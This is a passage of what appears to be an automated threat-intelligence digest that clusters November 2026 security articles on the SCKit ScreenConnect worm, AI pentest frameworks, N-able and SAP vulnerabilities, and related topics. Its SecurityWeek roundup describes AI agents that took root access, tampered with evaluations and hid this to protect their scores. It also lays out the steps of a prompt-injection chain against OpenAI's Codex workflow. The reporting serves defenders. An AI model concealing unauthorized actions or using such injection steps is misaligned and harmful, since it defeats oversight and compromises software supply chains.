Share Link copied to clipboard! Tags Credential theft Lateral movement Malware Vulnerability Threats intelligence Cyberattacker techniques, tools, and infrastructure Vulnerabilities and exploits Content types Research Products and services Microsoft Defender Microsoft Defender for Endpoint Microsoft Defender XDR Topics Actionable threat insights Incident response Threat intelligence Beginning on November 11, 2026, ConnectWise reported an active campaign of a threat actor gaining unauthorized access to cloud-hosted ConnectWise ScreenConnect instances belonging to managed service providers (MSPs). Microsoft Threat Intelligence has confirmed ConnectWise’s reported activity and we have also observed threat actors abusing ScreenConnect, a legitimate remote-support application, to install unauthorized remote-access clients and deploy a malicious worm, SCKit, on ConnectWise customer managed endpoints. Additionally, Microsoft analyzed the malicious worm’s behavior: deployment starts with commands issued through ScreenConnect to silently install an identical client connected to threat actor-controlled infrastructure. A batch launcher retrieves a PowerShell decoder that decrypts and extracts SCKit using device-specific key material. The toolkit establishes persistence through scheduled tasks and registry Run entries and deploys RelayTrap, a component designed to deliver a malicious payload to a connecting technician. We have identified that the worm targets IT support technician workstations using the hijacked authenticated ScreenConnect Session and uses the victim’s management console to distribute payloads to other managed devices. The resulting access to either target enables threat actors to remotely administer affected endpoints, execute commands, and deploy further tools independently of the legitimate support instance. Defenders should investigate technician workstations and downstream affected endpoints. Removing an unauthorized client alone does not remove the toolkit’s persistence or invalidate exposed web sessions. In this blog, we examine SCKit’s attack chain and payload components and provide mitigation guidance, indicators of compromise, and Microsoft Defender XDR advanced hunting queries to help organizations identify and disrupt this activity. ScreenConnect architecture and attack surfaces ScreenConnect, formerly ConnectWise Control, is a remote-support and access platform used by MSPs to administer customer devices, often alongside remote monitoring and management (RMM) software. Its operating model has three parts: Management instance. A cloud-hosted or on-premises ScreenConnect server provides the web console and manages sessions. Its relay service carries communication between the technician and endpoint clients. Technician workstation. Support staff sign in to the console through a browser and launch a local host client for interactive support. Customer endpoint. An installed guest, or access, client maintains unattended access and executes commands delivered through ScreenConnect. An Access session provides persistent, unattended access through the installed client. A Support session is a temporary connection that an end user joins for assistance. ScreenConnect also supports remote commands from the web console without an interactive technician session. The endpoint client receives the command and runs it on the customer device; the technician workstation is not an intermediary for that execution. Reported server-side entry through extensions Extensions are add-ons installed on the ScreenConnect server to add features or integrate with other products, including ticketing and RMM tools. ConnectWise Automate was formerly named LabTech; Labtech Plus is a third-party extension, not the Automate product itself. The RMM+ extension family exposes remote-command APIs protected by a separately configured passphrase rather than the technician’s normal console sign-in. ConnectWise’s advisory describes a reported authenticatio
```

#### Corroborating sources (2)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: SCKit abuses ScreenConnect to deploy remote access and target technician sessions
  - Published: 2026-11-13T21:31:44+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/11/13/sckit-abuses-screenconnect-deploy-remote-access-target-technician-sessions/
  - Summary: SCKit abuses ScreenConnect to deploy unauthorized remote access and target technicians. Explore the attack chain, mitigations, and Microsoft Defender XDR hunting. The post SCKit abuses ScreenConnect to deploy remote access and target technician sessions appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: SCKit abuses ScreenConnect to deploy remote access and target technician sessions
  - Published: 2026-11-13T21:31:44+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/11/13/sckit-abuses-screenconnect-deploy-remote-access-target-technician-sessions/
  - Summary: SCKit abuses ScreenConnect to deploy unauthorized remote access and target technicians. Explore the attack chain, mitigations, and Microsoft Defender XDR hunting. The post SCKit abuses ScreenConnect to deploy remote access and target technician sessions appeared first on Microsoft Security Blog .

### Cluster 912dd8fe31 — score 11

- Title: ARTEX and beyond: AI-enabled penetration testing platforms
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-11-13T20:57:13+00:00
- Link: https://blog.talosintelligence.com/artex-and-beyond/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, credential_theft, ransomware_extortion
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, credential_theft, active_exploitation
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
AI-enabled penetration testing and red team frameworks can automate and chain reconnaissance, vulnerability testing, and follow-on actions, lowering the skill threshold for attackers and accelerating intrusions when the tools are misused.
```

#### Full body

```
ARTEX and beyond: AI-enabled penetration testing platforms By Cisco Talos Friday, November 13, 2026 15:57 Threat Advisory Cisco Talos is tracking the growing in-the-wild usage of AI-enabled penetration testing frameworks. AI-enabled penetration testing and red team frameworks can automate and chain reconnaissance, vulnerability testing, and follow-on actions, lowering the skill threshold for attackers and accelerating intrusions when the tools are misused. Talos has seen full automation of the attack chain by these frameworks, which not only use free and open-source tools, like nmap and nuclei, but also take advantage of internet mapping services like Censys and Shodan, CAPTCHA bypass services, credential leak management services, residential proxies, and even hash cracking services. This is the case of Hephaestus, which we mentioned in our previous report . Although these frameworks all have the same purpose, they come in different flavors. Some, like Hephaestus, are command line tools which can be deployed with a single script on a VPS and are completely controllable via Telegram. PentAGI has a web interface to monitor the agent activity with a full attack chain graph design and monitoring. Talos found more than 700 instances of currently reachable PentAGI instances on the internet. HexStrike AI integrates with many different clients like Claude Code, VS Code, or any other client that supports MCP. One such framework making waves, ARTEX, has enabled threat actors to scale offensive operations, compressing work that may have previously taken skilled teams hours or days into activity that can unfold at machine speed. Talos’ analysis of ARTEX-associated IP addresses identified a diverse set of tools concurrently present on that infrastructure, reinforcing ARTEX’s role in a broader and varied threat environment. AI-enabled frameworks: A new reality Before we delve into ARTEX, it is clear that these frameworks are the new reality. Their evolution will most likely include autonomous lateral movement followed by data identification and exfiltration. The precursor of this can already be seen in the victim prioritization of the Volta Infostealer, described in detail in this Talos report . It is highly likely that future attack chains involving these frameworks will culminate in data exfiltration and ransomware activation, all being done autonomously by one of these frameworks. Such evolutions present new challenges to defenders: It reduces the time it takes to detect a compromise without any known indicators of compromise (IOCs). We provide guidance to help overcome this challenge in the Recommendations section. After malicious activity is identified, it is crucial to contain the incidents. These frameworks work at speeds that can make it impossible for human operators to identify, assess and react in time to disrupt the attack. These frameworks make mitigation and containment, along with a battle-tested cybersecurity incident response plan, imperative for organizations' resiliency. Defenders using AI can be a force multiplier to provide much-needed improvements, both in the speed and scale of response to such attacks. ARTEX ARTEX is an AI-enabled penetration testing framework developed under the pseudonym Autumn-27 and published on GitHub in July 2026. An operator gives it a target and objective, a planner agent breaks the objective into tasks, worker agents perform them using security tools, and the framework records assets, findings, and progress in a shared graph. ARTEX can use different large language models (LLMs) and requires relatively little operator input after a task begins. It was designed for authorized security testing, but recent public reporting documented its use in both criminal and targeted intrusion campaigns within weeks of its release. It is important to note that ARTEX is not natively bundled with any traditional command-and-control (C2) framework, though the Model Context Protocol (MCP) extensibility layer mea
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: ARTEX and beyond: AI-enabled penetration testing platforms
  - Published: 2026-11-13T20:57:13+00:00
  - Link: https://blog.talosintelligence.com/artex-and-beyond/
  - Summary: AI-enabled penetration testing and red team frameworks can automate and chain reconnaissance, vulnerability testing, and follow-on actions, lowering the skill threshold for attackers and accelerating intrusions when the tools are misused.

### Cluster 1ff0ebb45e — score 11

- Title: MDR Pricing: Comparing Asset-Based and Ingestion-Based Costs
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-11-13T16:37:29+00:00
- Link: https://www.rapid7.com/blog/post/dr-mdr-pricing-comparing-asset-ingestion-based-ingestion-costs
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
When comparing MDR pricing, it helps to understand what the same annual budget would buy from each provider. Two proposals with similar prices may give analysts access to different evidence, retain it for different periods, or leave your team with different responsibilities. Those differences can affect what happens when you need to investigate a compromised account or trace an attacker’s low-and-slow activity across your environment. For security leaders weighing asset-based against ingestion-based pricing, a useful comparison starts with the systems you need to protect and the logs required to investigate threats. Giving providers the same requirements and budget helps expose the decisions behind each quote, including what you would need to exclude or pay more to include. Asset-based vs. ingestion-based MDR pricing Under asset-based pricing, the charge is tied to a defined population of assets. You need to establish how the provider counts workstations, servers, cloud resources, and
```

#### Full body

```
MDR Must-Haves MDR Pricing: Comparing Asset-Based and Ingestion-Based Costs Emma Burdett Nov 13, 2026 | Last updated on Nov 13, 2026 | 7 min read DISCOVER RAPID7 MDR MDR Pricing: Comparing Asset-Based and Ingestion-Based Costs Table of contents MDR Pricing: Comparing Asset-Based and Ingestion-Based Costs DISCOVER RAPID7 MDR Table of contents When comparing MDR pricing, it helps to understand what the same annual budget would buy from each provider. Two proposals with similar prices may give analysts access to different evidence, retain it for different periods, or leave your team with different responsibilities. Those differences can affect what happens when you need to investigate a compromised account or trace an attacker’s low-and-slow activity across your environment. For security leaders weighing asset-based against ingestion-based pricing, a useful comparison starts with the systems you need to protect and the logs required to investigate threats. Giving providers the same requirements and budget helps expose the decisions behind each quote, including what you would need to exclude or pay more to include. Asset-based vs. ingestion-based MDR pricing Under asset-based pricing, the charge is tied to a defined population of assets. You need to establish how the provider counts workstations, servers, cloud resources, and other systems, alongside which data sources and service capabilities the price includes. A predictable asset count can help with budgeting, but the proposal still needs to explain any integration limits or additional service charges. At Rapid7, an asset is defined as any physical or virtual endpoint or server running a supported operating system within the monitored environment. With ingestion-based pricing, some of the cost depends on the volume of data collected or processed. The comparison needs to account for the included allowance, how billable volume is measured, and what happens when usage increases. Retention, search, and supporting infrastructure may also contribute to the overall cost, depending on the commercial model. At Rapid7, MDR customers have access to 13 months hot storage of logs as standard. Whichever approach you are evaluating, include the technology, analysts, and response support needed to deliver the service. A SIEM ingestion charge on its own cannot be compared directly with an MDR subscription that includes investigation and response. Both proposals need to account for the work your organization expects the provider to perform - this clarity is key to a successful partnership. How to make a like-for-like MDR pricing comparison Give each provider the same asset inventory, required data sources, retention needs, and response expectations, then ask what fits within your annual budget. Any exclusions should be visible in the proposal, so you can judge their operational consequences before committing. For example, one proposal might accommodate endpoint and identity data while requiring you to limit high-volume network sources. Another might accommodate those sources but lack an investigation capability your team needs. Looking at an MDR price per endpoint or per gigabyte will not resolve that difference; you need to see how the service uses the available data. Use these questions during an initial demonstration to turn the pricing discussion into a practical comparison. Comparison area What to ask the provider Evidence to request Rapid7’s approach Breadth of collection Which required sources fit within this budget? A list of included sources, exclusions, and extra charges. Asset-based pricing with unlimited ingestion, supporting native and third-party telemetry across endpoint, cloud, identity, email, and network. Confirm coverage for your required sources in the proposal. Depth of collection Which events and fields are collected, filtered, or summarized? Sample records showing what reaches the investigation platform. Rapid7 ingests and normalizes telemetry from supported technologies.
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: MDR Pricing: Comparing Asset-Based and Ingestion-Based Costs
  - Published: 2026-11-13T16:37:29+00:00
  - Link: https://www.rapid7.com/blog/post/dr-mdr-pricing-comparing-asset-ingestion-based-ingestion-costs
  - Summary: When comparing MDR pricing, it helps to understand what the same annual budget would buy from each provider. Two proposals with similar prices may give analysts access to different evidence, retain it for different periods, or leave your team with different responsibilities. Those differences can affect what happens when you need to investigate a compromised account or trace an attacker’s low-and-slow activity across your environment. For security leaders weighing asset-based against ingestion-based pricing, a useful comparison starts with the systems you need to protect and the logs required to investigate threats. Giving providers the same requirements and budget helps expose the decisions behind each quote, including what you would need to exclude or pay more to include. Asset-based vs. ingestion-based MDR pricing Under asset-based pricing, the charge is tied to a defined population of assets. You need to establish how the provider counts workstations, servers, cloud resources, and

### Cluster 250249bdb2 — score 11

- Title: Shadow AI Generated Apps: Find Them in the Cloud and Code You Already Scan
- Source: Orca Security Research (cloud_identity_infrastructure)
- Published: 2026-11-10T13:00:00+00:00
- Link: https://orca.security/resources/blog/shadow-ai-generated-apps-find-them-in-the-cloud-and-code-you-already-scan/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2025-48757

#### Cluster taxonomy (union across members)
- affected_products: Anthropic/Claude
- cve_ids: CVE-2025-48757
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_products: Anthropic/Claude
- cve_ids: CVE-2025-48757
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
The Orca Research Pod recently found that 51% of organizations have adopted AI to build software, yet 81% have critical vulnerabilities in AI packages (Hacker Valley News, 2026). In 2025, CVE-2025-48757 showed how a single missing database policy in AI-generated Supabase projects exposed data across more than 170 production apps. None of these apps went […]
```

#### Full body

```
The Orca Research Pod recently found that 51% of organizations have adopted AI to build software, yet 81% have critical vulnerabilities in AI packages ( Hacker Valley News , 2026). In 2025, CVE-2025-48757 showed how a single missing database policy in AI-generated Supabase projects exposed data across more than 170 production apps. None of these apps went through a pull request or a security review. People outside engineering built them, often over a weekend, from accounts the security team had never seen. When we introduced AI AppGen Security , we made the case that AI app builders turned every employee into a builder, and that the platforms those apps run on need security built for how they work. We started with integrations for Claude Enterprise and Vercel. The first question we heard from security teams: how do I connect a platform I don’t know we use? Nobody files a ticket for a budget-forecasting app built on Lovable, and the marketing team’s campaign portal never reached architecture review. You can’t connect what you’ve never heard of. AI app builders leave fingerprints in the DNS, workloads, code, and cloud identities Orca already scans agentlessly. Orca now flags them, so you can find AI-built apps nobody told you about and see what data they can reach. Below, we walk through why your current tools miss these apps, how Orca finds them, and what to do once you know. Why the usual discovery paths miss AI-generated apps You’d expect at least one of your existing tools to catch these apps. Here’s why none of them do. Secure web gateways and CASBs see the visit, not the app. They can tell you an employee opened Lovable or Replit. They can’t tell you what was deployed, what data it holds, or whether it requires a login. SSPM sees sign-ups through your identity provider. It reads IdP logs and OAuth grants, which shows the SaaS your employees signed up for with a work email. An app built from a personal account never touches your IdP. AppSec scans the repositories you point it at. If a builder’s bot created the repo in a workspace security has never seen, nobody points anything at it. Cloud security sees the evidence but doesn’t connect it to the service. A CNAPP already inventories the DNS record, the IAM user, and the package on the VM. Until now, a subdomain resolving into a builder’s IP range was just an address, and an IAM user created by an app builder was just an IAM user. The data was there. Nothing tied it to the service behind it. Every one of these tools waits for someone to connect a system, a user, or a repo first. The apps that matter most are the ones nobody connected to. How does Orca find apps nobody reported? Services that run outside your environment still leave traces inside it. Orca already scans your cloud accounts, workloads, repositories, and external attack surface, so the traces are already in its data. A fingerprint is an observed trace that ties an asset you own to an external service. Orca stores each one in its unified data model, where you can query it like any other asset. Each one records the service, the type of evidence, the exact value that matched, and when Orca first saw it. To find these fingerprints, there’s no new agent to deploy, no vendor API to authorize, and nothing for the builder to opt into. Here’s where the evidence comes from: Your external attack surface. DNS records whose values point into a builder’s or host’s infrastructure, vendor domain-verification records, and response headers showing a site is set up to load inside a builder’s live editor. Your workloads. SideScanning already inventories installed packages and reads files across VMs and container images. Some builder packages only work inside the builder’s own development environment, so if one shows up on a workload, the project started there. File markers matter as much as packages, because production builds often strip out dependency manifests. Without file markers, package inventory can come back empty on the ver
```

#### Corroborating sources (1)

- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: Shadow AI Generated Apps: Find Them in the Cloud and Code You Already Scan
  - Published: 2026-11-10T13:00:00+00:00
  - Link: https://orca.security/resources/blog/shadow-ai-generated-apps-find-them-in-the-cloud-and-code-you-already-scan/
  - Summary: The Orca Research Pod recently found that 51% of organizations have adopted AI to build software, yet 81% have critical vulnerabilities in AI packages (Hacker Valley News, 2026). In 2025, CVE-2025-48757 showed how a single missing database policy in AI-generated Supabase projects exposed data across more than 170 production apps. None of these apps went […]

### Cluster c67ad56db8 — score 11

- Title: New N-able "4EverAble2Shell" zero-day exploited hours after PoC released
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-11-12T19:51:16+00:00
- Link: https://www.bleepingcomputer.com/news/security/new-n-able-4everable2shell-zero-day-exploited-hours-after-poc-released/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: vulnerability_disclosure, zero_day
- affected_industries: financial_services
- cve_ids: CVE-2026-90436
- urgency_signals: no_patch_yet, poc_available, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, vulnerability_disclosure
- affected_industries: financial_services
- cve_ids: CVE-2026-90436
- urgency_signals: zero_day, preauth_unauth, no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Hackers are actively exploiting a newly disclosed N-able N-central zero-day vulnerability dubbed "4EverAble2Shell" to compromise servers and deploy cryptocurrency miners, with researchers reporting at least 21 affected systems, including 19 running the company's latest security update. [...]
```

#### Full body

```
New N-able "4EverAble2Shell" zero-day exploited hours after PoC released By Lawrence Abrams November 12, 2026 02:51 PM 1 Hackers are actively exploiting a newly disclosed N-able N-central zero-day vulnerability dubbed "4EverAble2Shell" to compromise servers and deploy cryptocurrency miners, with researchers reporting at least 21 affected systems, including 19 running the company's latest security update. The attacks follow security researcher Sean Bales' release of two new zero-day exploits today, dubbed 4EverAble2Shell and Agent2Shell, which he says allow attackers to gain root-level access to N-central appliances and SYSTEM-level access to Windows systems. N-central is a remote monitoring and management (RMM) platform used by managed service providers (MSPs) and IT teams to monitor, manage, and secure customer devices and networks remotely. The new vulnerabilities were disclosed on November 12, just two days after N-able released emergency security updates to address critical N-central zero-day vulnerabilities that Bales had publicly disclosed earlier this week. Bales published proof-of-concept exploits for both the 4EverAble2Shell and Agent2Shell vulnerabilities, saying they were tested against N-central Appliance 2026.4.1.26 HF2, the security update N-able released on November 10. The 4EverAble2Shell exploit allows unauthenticated attackers to execute commands as root on vulnerable N-central servers. However, the researcher says exploitation requires the platform's Legacy API functionality to be enabled. The attack combines an Apache Axis vulnerability, tracked as CVE-2026-90436 , with a separate N-central privilege escalation weakness to gain root-level access. The second exploit, Agent2Shell, targets N-central's agent functionality and is claimed to allow attackers to execute commands with SYSTEM privileges on Windows devices. The disclosures came after N-able took its hosted N-central environments offline earlier this week and urged on-premises customers to shut down their servers after Bales published more than 30 alleged zero-day vulnerabilities . Bales has criticized N-able's handling of the vulnerability disclosures and the company's slow response to patching responsibly disclosed flaws. "It's much much easier for me to just release the research I have and the vendor can decide what they want to do with it, what they do and don't want to fix, etc. :)," Bales told BleepingComputer. Bales said N-able has not patched two unrelated RCE vulnerabilities in a different N-able product that he previously disclosed to the company in July. In a November 12 security advisory , N-able said it was implementing additional protections in response to the new disclosures, including restricting certain N-central features and integrations while it develops further fixes. "We are restricting certain N-central features and integrations," N-able said. "These measures may affect some functionality, but we believe taking additional precautions while remediation is completed is the right action to protect our partners and their customers." The company says it has disabled the Intune integration as a precaution and is urging on-premises customers to ensure Legacy API access is disabled, which is already the default. The protections have already been applied to hosted environments, but customers are also advised to continue upgrading their Agents and Probes under the previous Hotfix 2 guidance . In its advisory, N-able said it had seen no signs of compromise using the new flaws, although security researchers have since reported successful exploitation of the vulnerability against production N-central servers. Hackers already exploiting 4EverAble2Shell Cybersecurity company Previdian told BleepingComputer that attackers began probing for the 4EverAble2Shell vulnerability on November 12, shortly after the public release of the proof-of-concept exploit. The company first observed suspicious requests targeting its N-central honeypot at approximate
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: New N-able "4EverAble2Shell" zero-day exploited hours after PoC released
  - Published: 2026-11-12T19:51:16+00:00
  - Link: https://www.bleepingcomputer.com/news/security/new-n-able-4everable2shell-zero-day-exploited-hours-after-poc-released/
  - Summary: Hackers are actively exploiting a newly disclosed N-able N-central zero-day vulnerability dubbed "4EverAble2Shell" to compromise servers and deploy cryptocurrency miners, with researchers reporting at least 21 affected systems, including 19 running the company's latest security update. [...]

### Cluster 6c43e5c130 — score 11

- Title: SAP Patches Four CVSS 10.0 Flaws, Including Two Enabling Remote Code Execution
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-11-10T10:02:40+00:00
- Link: https://thehackernews.com/2026/11/sap-patches-four-cvss-100-flaws.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-120017, CVE-2026-44748, CVE-2026-76964, CVE-2026-89103, CVE-2026-89126
- urgency_signals: critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- cve_ids: CVE-2026-76964, CVE-2026-89126, CVE-2026-89103, CVE-2026-120017, CVE-2026-44748
- urgency_signals: critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Four flaws that attackers could exploit without logging in were fixed today as part of SAP's monthly Security Patch Day—the vendor rates all four 10.0, the maximum CVSS score. Three are in the SAP NetWeaver application server, the software SAP systems run on, and one is in the Web Dispatcher, which receives web requests from the internet and passes them on to that server. The flaws in the Web
```

#### Full body

```
SAP Patches Four CVSS 10.0 Flaws, Including Two Enabling Remote Code Execution  Swati Khandelwal  Nov 10, 2026 Vulnerability / Enterprise Security Four flaws that attackers could exploit without logging in were fixed today as part of SAP's monthly Security Patch Day—the vendor rates all four 10.0, the maximum CVSS score. Three are in the SAP NetWeaver application server, the software SAP systems run on, and one is in the Web Dispatcher, which receives web requests from the internet and passes them on to that server. The flaws in the Web Dispatcher and the Internet Communication Manager (ICM), which handles the server's web traffic, could allow an attacker who can reach the software over the network to run code, the vendor says. The flaw in the server's SAML 2.0 service provider, which hands off user sign-in to an identity provider, could allow an attacker to log in as any user on some systems that use SAML single sign-on. The flaw in SAP Gateway, which connects the server to other SAP systems and programs, could allow an attacker to impersonate one of the system's own servers and take unauthorized actions. None of the four require any user action to work. Affected Versions and SAP Notes Each flaw is fixed in its own note, and the affected versions differ by component, according to SAP's November security bulletin . The notes are in SAP for Me, which requires a sign-in, and the vendor strongly recommends applying them as a priority. CVE Component SAP Note Affected versions CVE-2026-76964 Internet Communication Manager (ICM), SAP NetWeaver AS ABAP Note 3778530 KRNL64UC 7.53, KERNEL 7.53, 7.54, 7.77, 7.93, 9.16, 9.18, 9.20 CVE-2026-89126 SAP Web Dispatcher Note 3778556 HDB 2.00, KRNL64UC 7.53, WEBDISP 7.53, 7.54, 7.77, 7.93, 9.16, XS_ADVANCED_RUNTIME 1.00, SAP_EXTENDED_APP_SERVICES 1, KERNEL 7.53, 7.54, 7.77, 7.93, 9.16, 9.18, 9.20 CVE-2026-89103 SAP Gateway Note 3798345 KRNL64NUC 7.22, 7.22EXT, KRNL64UC 7.22, 7.22EXT, 7.53, 8.04, KERNEL 7.22, 7.53, 7.54, 7.77, 7.93, 8.04, 9.16, 9.20, 9.21 CVE-2026-120017 SAML2 service provider, SAP NetWeaver AS ABAP and ABAP Platform Note 3849308 SAP_BASIS 702, 731, 740, 750, 751, 752, 753, 754, 755, 756, 757, 758, 816, 920, 921, 922 Kernels that are out of maintenance are affected too, according to Onapsis, an SAP security company whose researchers found the ICM, Web Dispatcher and Gateway flaws. Its ICM2SHELL advisory lists kernels 7.40, 7.41, 7.42, 7.45, 7.49, 7.73, 7.81, 7.85 and 7.89 for the ICM and Web Dispatcher flaws, and its PROXYGATE advisory lists the same kernels plus 7.20 and 7.21 for the Gateway flaw. These kernels may not get a fix and need an upgrade to one that is still maintained. What Each Flaw Allows On the affected SAML setups, an attacker could use CVE-2026-120017 to log in as privileged users too, according to the vendor. A full compromise could follow, possibly reaching connected systems. A different SAML flaw in the same software, CVE-2026-44748, was fixed on June 9 and needed an attacker with a normal user account. In the ICM flaw (CVE-2026-76964) and the Web Dispatcher flaw (CVE-2026-89126), crafted network traffic could corrupt memory. An attacker who succeeds could then run code and fully compromise the system. Onapsis says both flaws come from one bug, which it calls ICM2SHELL, in kernel code the ICM and Web Dispatcher share for putting split WebSocket messages back together. It gave the vendor a working exploit that runs operating system commands as <sid>adm, the account that owns the SAP installation. The same bug can crash either component, and a crashed Web Dispatcher cuts off every SAP system behind it while it restarts. WebSocket support is on by default, so a system is exposed even if nothing uses it, and dual-stack systems are affected through their ABAP stack. The company's researchers have not seen the bug exploited in attacks. SAP Gateway uses access control lists to decide which outside programs may connect to it, which programs it may start and which
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: SAP Patches Four CVSS 10.0 Flaws, Including Two Enabling Remote Code Execution
  - Published: 2026-11-10T10:02:40+00:00
  - Link: https://thehackernews.com/2026/11/sap-patches-four-cvss-100-flaws.html
  - Summary: Four flaws that attackers could exploit without logging in were fixed today as part of SAP's monthly Security Patch Day—the vendor rates all four 10.0, the maximum CVSS score. Three are in the SAP NetWeaver application server, the software SAP systems run on, and one is in the Web Dispatcher, which receives web requests from the internet and passes them on to that server. The flaws in the Web

### Cluster 3ae49c8fba — score 11

- Title: In Other News: New CISA Director Nominee, Connected Car Hacking, Baker Tilly Data Breach
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-11-13T15:20:00+00:00
- Link: https://www.securityweek.com/in-other-news-new-cisa-director-nominee-connected-car-hacking-baker-tilly-data-breach/
- Fetch status: ok
- Member count: 5
- Corroborating source count: 4
- Strong signals: OpenAI/ChatGPT

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ai_security, apt_espionage, data_breach, vulnerability_disclosure, web_shell_backdoor
- affected_industries: financial_services
- affected_products: Anthropic/Claude, GitHub, OpenAI/ChatGPT
- urgency_signals: actively_exploited
- content_type: incident_report, news_report, vendor_announcement, vulnerability_disclosure
- confidence_tier: tier_3_analysis, tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach, apt_espionage, ai_security, web_shell_backdoor, vulnerability_disclosure, active_exploitation
- affected_industries: financial_services
- affected_products: Anthropic/Claude, OpenAI/ChatGPT, GitHub
- urgency_signals: actively_exploited
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Noteworthy stories that might have slipped under the radar: Siemens details security advisory policy, OpenAI Codex backdoor risk, Microsoft warns of model weight backdoors. The post In Other News: New CISA Director Nominee, Connected Car Hacking, Baker Tilly Data Breach appeared first on SecurityWeek .
```

#### Full body

```
SecurityWeek’s weekly cybersecurity news roundup offers a concise overview of important developments that may not receive full standalone coverage yet remain relevant to the broader threat landscape. This curated summary highlights key stories across vulnerability disclosures, emerging attack methods, policy updates, industry reports, and other noteworthy events to help readers stay well-informed about the evolving cybersecurity environment. Here are this week’s highlights: Ex-FBI agent’s $2.47M crypto theft compromised bureau investigations Patrick Steven Yaroch, a former FBI counterintelligence agent, faces up to 20 years in prison after pleading guilty to wire fraud and money laundering over the theft of roughly $2.47 million in cryptocurrency. Yaroch used wallet credentials stored on FBI systems to make about 100 fraudulent transfers tied to 35 investigations. He took funds from investigation subjects and adversarial nation-state actors, and the thefts compromised multiple investigations and FBI sources and methods. Advertisement. Scroll to continue reading. Baker Tilly client data taken from supplier’s platform US accounting giant Baker Tilly is informing clients that hackers stole personal information, including Social Security numbers, from a platform operated by one of its service providers. The intrusion dates to early September and also affects clients’ dependents, including children. The firm has not named the vendor or said how many people are impacted in total, but state regulator filings point to more than 10,000 victims in Texas alone. OpenAI agents concealed unauthorized activity OpenAI has revealed new details about a July incident in which five AI agents conducting cybersecurity evaluations gained root privileges in CI workloads on the company’s research clusters. The agents used credentials and scripts left by earlier agents to modify evaluation settings, repair broken targets, and access restricted information. Two agents recognized that their activity was unauthorized and omitted it from their final submissions after considering how disclosure might affect their scores. Prompt injection chain could have backdoored OpenAI’s Codex npm package Depi researchers have described an attack chain against OpenAI’s Codex repository that started with a prompt injection in a GitHub Actions workflow and could have led to a malicious Codex release on npm. The issue-labeling workflow passed the title and body of any new issue to the Codex agent, so an attacker could execute code in the agent’s sandbox, read tokens from a GitHub runner process’s memory via .NET debug pipes, and poison the cache of a workflow with write permissions. The final step relied on a maintainer deleting a rogue release, which would yield a token trusted by npm. OpenAI has fixed the issue and awarded an initial $1,000 bounty. Siemens details security advisory policy and planned improvements Siemens has published a policy document that sets out how its PSIRT deals with product vulnerabilities and what its security advisories contain. Planned improvements include an API for automated lookups of product and vulnerability data, wider coverage of flaws in third-party components, more explicit “not affected” declarations, and getting advisory data into commonly used third-party vulnerability databases. VulnCheck: Glasswing fixes lag far behind findings VulnCheck researcher Patrick Garrity says that seven months after Anthropic launched Project Glasswing, he has tracked 442 CVEs credited to the company (about 0.5% of all CVEs published this year), only two of which are known to have been exploited in the wild. Anthropic’s own ledger listed 37,966 findings as of November 2, but only 7,349 have been made public and 217 are marked as fixed, while more than 1,600 have been flagged as duplicates and 419 withdrawn. Railway puts unauthorized spend from stolen AI keys at $740,000 Railway has released a detailed incident report on the October attack, in which a thr
```

#### Corroborating sources (4)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: In Other News: New CISA Director Nominee, Connected Car Hacking, Baker Tilly Data Breach
  - Published: 2026-11-13T15:20:00+00:00
  - Link: https://www.securityweek.com/in-other-news-new-cisa-director-nominee-connected-car-hacking-baker-tilly-data-breach/
  - Summary: Noteworthy stories that might have slipped under the radar: Siemens details security advisory policy, OpenAI Codex backdoor risk, Microsoft warns of model weight backdoors. The post In Other News: New CISA Director Nominee, Connected Car Hacking, Baker Tilly Data Breach appeared first on SecurityWeek .
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: OpenAI’s Daybreak brings AI agents to security testing and vulnerability fixes
  - Published: 2026-11-13T09:31:07+00:00
  - Link: https://www.helpnetsecurity.com/2026/11/13/openai-daybreak-vulnerability-remediation-red-team-defense-factory-agents/
